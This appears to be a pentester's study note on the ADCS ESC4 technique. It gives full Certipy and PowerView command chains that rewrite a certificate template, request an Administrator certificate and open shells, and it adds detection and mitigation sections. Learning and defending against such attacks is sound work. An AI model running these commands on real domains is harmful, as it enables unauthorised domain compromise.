---
title: "ESC4 — Vulnerable Certificate Template Access Control"
description: "ESC4 is a permission-level attack, not a template configuration attack. Every ESC attack up to this point (ESC1–3) abused what a template was configured…"
category: active-directory
subcategory: "ADCS & Certificates"
tags: ["active-directory", "adcs", "privilege-escalation"]
tools: ["Rubeus", "Certipy", "BloodHound", "Evil-WinRM", "OpenSSL"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/ACL-ESC-Techniques/ESC4 — Vulnerable Certificate Template Access Control.md"
---
# ESC4 — Vulnerable Certificate Template Access Control

## Quick Reference

| Field | Value |
|-------|-------|
| **Category** | Certificate Template Permission Abuse |
| **Difficulty** | Medium |
| **Pre-requisites** | Write/Owner ACE on a certificate template object |
| **Tools** | Certipy, Certify.exe, PowerView, BloodyAD |
| **OPSEC Noise** | High — modifying AD template objects generates 5136 events |
| **One-liner** | Abuse write permissions on a template to add `ENROLLEE_SUPPLIES_SUBJECT` flag and Client Auth EKU, turning it into an ESC1-vulnerable template. |

***

## What Is ESC4?

ESC4 is a **permission-level attack, not a template configuration attack**. Every ESC attack up to this point (ESC1–3) abused *what a template was configured to do*. ESC4 is different — it abuses *who has the right to change a template*. When a low-privileged user holds certain write-level permissions over a certificate template AD object, they can **rewrite the template's configuration** to introduce ESC1 vulnerabilities that didn't previously exist, exploit the newly misconfigured template, then optionally restore the original config to cover their tracks.

Certificate templates are just AD objects stored in `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration`. Like any AD object, they have a DACL. When that DACL is loose, the template becomes a weapon you forge yourself.

***

## The Dangerous ACEs — What You Need on the Template

Any **one** of these permissions on a certificate template object is enough to execute ESC4:

| ACE / Right | What It Lets You Do |
|-------------|---------------------|
| **Owner** | Full control over the object — can modify the DACL, grant yourself anything |
| **WriteOwner** | Take ownership of the template object, then gain full control |
| **WriteDACL** | Modify the DACL directly — grant yourself `WriteProperty` or `GenericAll` |
| **WriteProperty** | Directly modify any attribute on the template — this is the most direct path |
| **GenericWrite** | Covers all `WriteProperty` rights |
| **GenericAll** / **FullControl** | Unrestricted access — modify anything |

The attack chain is always: **Use your write permission → Mutate template to ESC1 → Request cert as Administrator → Authenticate**.

***

## Step 0 — Enumeration

```bash
# Standard scan
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -vulnerable -stdout

# With hash
certipy-ad find -u 'lowpriv@domain.htb' -hashes :NTHASH \
  -dc-ip $TARGET -vulnerable -stdout

# Grep for ESC4 if output saved to file
cat certipy_output.txt | grep "ESC4"
```

### What Vulnerable ESC4 Output Looks Like

```
Template Name                       : VulnTemplate
Enabled                             : True
Client Authentication               : False      ← Not yet exploitable directly
Enrollee Supplies Subject           : False      ← Not yet vulnerable to ESC1
Requires Manager Approval           : True       ← Locked down... for now
Extended Key Usage                  : Encrypting File System

Permissions
  Enrollment Permissions
    Enrollment Rights     : DOMAIN\Domain Users
  Object Control Permissions
    Owner                 : DOMAIN\Administrator
    Write Owner Principals: DOMAIN\Domain Users   ← ⚠️ DANGEROUS
    Write Dacl Principals : DOMAIN\Domain Users   ← ⚠️ DANGEROUS
    Write Property Principals: DOMAIN\Domain Users ← ⚠️ DANGEROUS
    Full Control Principals: DOMAIN\lowpriv       ← ⚠️ DANGEROUS

[!] Vulnerabilities
  ESC4 : 'DOMAIN\Domain Users' has dangerous permissions
```

> 💡 Certipy may also flag this via BloodHound edges. In BloodHound, look for edges like `GenericWrite`, `WriteDACL`, `WriteOwner`, or `GenericAll` from a low-priv principal to a certificate template node.

***

## The Core Technique — Template Mutation via `certipy template`

Certipy has a dedicated `template` subcommand that automates the template mutation for you. It:
1. **Saves** the original template config to a JSON backup file
2. **Overwrites** the template with ESC1-vulnerable settings
3. Lets you **restore** the original config after exploitation

***

## Full Attack Chain — Linux (Certipy)

### Step 1 — Save the original template config (IMPORTANT — do this first)

```bash
certipy-ad template \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -template 'VulnTemplateName' \
  -save-old

# Output: VulnTemplateName.json  ← Keep this safe for restoration
```

> ⚠️ **Always back up the original config.** On a real engagement or exam, modifying a live template without restoring it is noisy and could break legitimate business processes. On HTB it matters less, but build the habit now.

***

### Step 2 — Mutate the template to be ESC1-vulnerable

```bash
certipy-ad template \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -template 'VulnTemplateName'
```

**What Certipy does under the hood**:
- Sets `msPKI-Certificate-Name-Flag` → `ENROLLEE_SUPPLIES_SUBJECT` (0x1)
- Sets `msPKI-EnrollmentFlag` → removes `PEND_ALL_REQUESTS` (0x2)
- Sets `mspki-ra-signature` → `0`
- Sets `pKIExtendedKeyUsage` → `1.3.6.1.5.5.7.3.2` (Client Authentication)
- Sets `mspki-certificate-application-policy` → Client Authentication OID

**Expected output:**
```
[*] Updating certificate template 'VulnTemplateName'
[*] Successfully updated 'VulnTemplateName'
```

You can verify the mutation worked by re-running the find command:
```bash
certipy-ad find -u 'lowpriv@domain.htb' -p 'Password123!' \
  -dc-ip $TARGET -vulnerable -stdout
# The template should now also show ESC1 vulnerability
```

***

### Step 3 — Exploit the now-ESC1-vulnerable template

```bash
certipy-ad req \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -ca 'DOMAIN-CA-NAME' \
  -template 'VulnTemplateName' \
  -upn 'administrator@domain.htb'

# Output: administrator.pfx
```

***

### Step 4 — Authenticate

```bash
certipy-ad auth \
  -pfx administrator.pfx \
  -username administrator \
  -domain domain.htb \
  -dc-ip $TARGET

# Output: administrator.ccache + NT hash
```

***

### Step 5 — RESTORE the original template (critical)

```bash
certipy-ad template \
  -u 'lowpriv@domain.htb' \
  -p 'Password123!' \
  -dc-ip $TARGET \
  -template 'VulnTemplateName' \
  -configuration VulnTemplateName.json

# Output: [*] Successfully updated 'VulnTemplateName'
```

> 💡 On a real engagement you restore this immediately after getting your cert. On HTB boxes, restore out of good habit — it also proves you understand clean-up, which is an OSCP/exam requirement.

***

### Step 6 — Get your shell

```bash
# Kerberos TGT
export KRB5CCNAME=administrator.ccache
wmiexec.py -k -no-pass DC01.domain.htb
evil-winrm -i DC01.domain.htb -r domain.htb

# Pass-the-Hash
evil-winrm -i $TARGET -u administrator -H <NTHASH>
psexec.py administrator@$TARGET -hashes :NTHASH
```

***

## Full Attack Chain — Windows (PowerView + Certify.exe + Rubeus)

On Windows, you manually mutate the template attributes using **PowerView** before using Certify:

```powershell
Import-Module .\PowerView.ps1

# ── Step 1: Grant enrollment rights to Domain Users ─────────────────────────
Add-DomainObjectAcl -TargetIdentity 'VulnTemplate' `
  -PrincipalIdentity 'Domain Users' `
  -RightsGUID '0e10c968-78fb-11d2-90d4-00c04f79dc55' `
  -TargetSearchBase "LDAP://CN=Configuration,DC=domain,DC=local" -Verbose

# ── Step 2: Disable Manager Approval (set EnrollmentFlag to 9) ──────────────
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" `
  -Identity 'VulnTemplate' -Set @{'mspki-enrollment-flag'=9} -Verbose

# ── Step 3: Disable Authorized Signature Requirement ────────────────────────
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" `
  -Identity 'VulnTemplate' -Set @{'mspki-ra-signature'=0} -Verbose

# ── Step 4: Enable SAN Specification (ENROLLEE_SUPPLIES_SUBJECT = 1) ─────────
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" `
  -Identity 'VulnTemplate' -Set @{'mspki-certificate-name-flag'=1} -Verbose

# ── Step 5: Set Client Authentication EKU ───────────────────────────────────
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" `
  -Identity 'VulnTemplate' -Set @{'pkiextendedkeyusage'='1.3.6.1.5.5.7.3.2'} -Verbose

Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local" `
  -Identity 'VulnTemplate' -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose

# ── Step 6: Request cert with injected SAN ───────────────────────────────────
.\Certify.exe request /ca:DC01.domain.local\DOMAIN-CA /template:VulnTemplate /altname:administrator
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# ── Step 7: Get TGT + NT Hash ────────────────────────────────────────────────
.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
```

***

## ESC4 Visual Attack Flow

```
[lowpriv has WriteProperty over VulnTemplate]
              │
              │  certipy template -template VulnTemplate
              ▼
[Template mutated → ESC1 flags written]
  mspki-certificate-name-flag    = ENROLLEE_SUPPLIES_SUBJECT
  mspki-enrollment-flag          = no PEND_ALL_REQUESTS
  pKIExtendedKeyUsage            = Client Authentication
              │
              │  certipy req -template VulnTemplate -upn administrator@domain.htb
              ▼
[administrator.pfx issued]
              │
              │  certipy auth -pfx administrator.pfx
              ▼
[TGT + NT Hash for Administrator]
              │
              │  certipy template -configuration VulnTemplate.json  ← RESTORE
              ▼
[Template restored — evidence minimised]
```

***

## Common Errors and Fixes

| Error | Cause | Fix |
|-------|-------|-----|
| `Access Denied` on template mutation | You have `WriteOwner` but not yet `WriteProperty` — need to take ownership first | Use `Set-DomainObjectOwner -Identity VulnTemplate -OwnerIdentity lowpriv` first, then give yourself `GenericAll` |
| `Successfully updated` but template doesn't show ESC1 | AD replication delay | Wait 30–60 seconds, re-enumerate |
| `Certificate has no object SID` | Expected behaviour post-mutation | Proceed — auth will still work |
| `KDC_ERR_PADATA_TYPE_NOSUPP` on auth | PKINIT not supported on that DC | Try specifying another DC with `-dc-ip` |

***

## ESC4 vs ESC1–3 Comparison

| | ESC1 | ESC2 | ESC3 | ESC4 |
|---|---|---|---|---|
| **Attack type** | Template config abuse | Template config abuse | Template config abuse | **Template permission abuse** |
| **What you abuse** | SAN flag | Any Purpose EKU | CRA EKU | Write ACE on template object |
| **Pre-existing vuln** | ✅ Template already misconfigured | ✅ Already misconfigured | ✅ Already misconfigured | ❌ **You create the misconfiguration** |
| **Restoration needed** | ❌ | ❌ | ❌ | ✅ Strongly recommended |
| **BloodHound visible** | Via `Enrollment Rights` | Via `Enrollment Rights` | Via `Enrollment Rights` | ✅ **Via ACE edges on template node** |
| **Certipy command** | `req -upn` | `req -upn` | `req -on-behalf-of` | **`template` → `req -upn` → `template restore`** |

***

## Detection Indicators

- **Event ID 4899** — A certificate template was changed
- Look for rapid sequences of: **4899 (template changed)** → **4886 (cert requested)** → **4887 (cert issued)** → **4899 (template changed back)** — the classic ESC4 pattern
- Monitor AD attribute changes on `pKICertificateTemplate` objects — specifically `msPKI-Certificate-Name-Flag`, `pKIExtendedKeyUsage`, `msPKI-Enrollment-Flag`
- Alert on any non-admin principal modifying certificate template AD objects

***

## Mitigation

- **Audit template DACLs regularly** — `Domain Users`, `Authenticated Users`, or any non-admin group should never have `WriteProperty`, `WriteDACL`, `WriteOwner`, or `GenericAll` on a template object
- **Use the principle of least privilege** — only PKI admins should have write rights over templates
- **Monitor with BloodHound** — run BloodHound regularly and check for edges to certificate template nodes from low-priv principals
- **Enable AD auditing** on the `CN=Certificate Templates` container — changes should fire **Event ID 4899** which is auditable

***

Sources
 AD CS 102: How to Detect and Mitigate ESC4 Attacks on… | BeyondTrust https://www.beyondtrust.com/blog/entry/esc4-attacks
 AD CS Security: Understanding and Exploiting ESC Techniques https://www.vaadata.com/blog/ad-cs-security-understanding-and-exploiting-esc-techniques/
 Detecting ADCS Privilege Escalation: How Misconfigured ... https://hawk-eye.io/2025/09/detecting-adcs-privilege-escalation-how-misconfigured-certificates-expose-active-directory/
 How one misconfiguration in ADCS can lead to full AD Forest compromise https://m365internals.com/2022/11/07/how-one-misconfiguration-in-adcs-can-lead-to-full-ad-forest-compromise/
 Active Directory Certificate Services (ADCS – ESC4) - RBT Security https://www.rbtsec.com/blog/active-directory-certificate-services-adcs-esc4/
 An Expert Guide to Fortifying Active Directory Certificate ... https://www.nccgroup.com/research-blog/defending-your-directory-an-expert-guide-to-fortifying-active-directory-certificate-services-adcs-against-exploitation/
 ADCS ESC4: Vulnerable Certificate Template Access Control https://www.hackingarticles.in/adcs-esc4-vulnerable-certificate-template-access-control/
 redblock_team-11.-ADCS-Attacks.pdf https://ppl-ai-file-upload.s3.amazonaws.com/web/direct-files/attachments/14624338/ba26726a-dc39-49bb-a7f4-de582faee79b/redblock_team-11.-ADCS-Attacks.pdf
 Common ADCS Vulnerabilities: Logging, Exploitation ... - Lares Labs https://labs.lares.com/adcs-exploits-investigations-pt2/
 ADCS ESC4: Vulnerable Certificate Template Access Control https://www.facebook.com/cybersna/posts/a-critical-adcs-esc4-vulnerability-allows-attackers-with-control-permissions-to-/1002681098728664/
 ESC4 - Access Control Vulnerabilities | B00t2R00t - GitBook https://h3ll-ka1ser.gitbook.io/boot2root/active-directory-penetration-testing/active-directory-certificate-services-adcs/mindmaps/access-control-vulnerabilities-esc4
 Penetration Test Client Version 10 released 26 February 2023 Page ... https://www.coursehero.com/file/p7rd5udu/Penetration-Test-Client-Version-10-released-26-February-2023-Page-19-Figure-8/
 ADCS ESC4: Certificate Authentication Failure Fix - LinkedIn https://www.linkedin.com/posts/osher-jacobs_activedirectory-certificateservices-adcs-activity-7421147456517611520-S8KP
 Active Directory Certificate Services (AD CS) Exploitation - VOIDREAD https://voidread.pages.dev/posts/ad-cs-abuses/
 The Shocking Truth About ADCS Templates Nobody Tells You [ESC4] https://www.youtube.com/watch?v=pgA0zP2n0Ok
